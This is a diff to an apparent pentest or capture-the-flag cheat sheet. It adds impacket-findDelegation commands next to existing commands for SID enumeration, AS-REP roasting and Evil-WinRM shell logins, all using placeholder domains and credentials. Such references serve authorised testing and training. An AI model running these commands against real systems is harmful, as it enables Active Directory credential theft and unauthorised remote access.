@@ -351,6 +351,12 @@ enum4linux -a target                  # Enumerate shares/users 🔍
 134. impacket-lookupsid fakeorg.local/john.doe:Passw0rd123!@192.168.1.100
 135. impacket-GetNPUsers fakeorg.local/jane.smith:SecurePass456@ -dc-ip 192.168.1.100 -request
 
+################## FOR DELEGATION ######################
+impacket-findDelegation -h
+impacket-findDelegation ctf.local/svc.mssql:'password'@10.10.10.10
+impacket-findDelegation -hashes :ntlmhash ctf.local/svc.mssql@10.10.10.10
+impacket-findDelegation -k -no-pass ctf.local/svc.mssql@10.10.10.10
+
 ## 11. Evil-WinRM (Remote Shell Access)
 136. evil-winrm -i 192.168.1.100 -u john.doe -p 'Passw0rd123!'
 137. evil-winrm -i 192.168.1.100 -u jane.smith -p 'SecurePass456@'
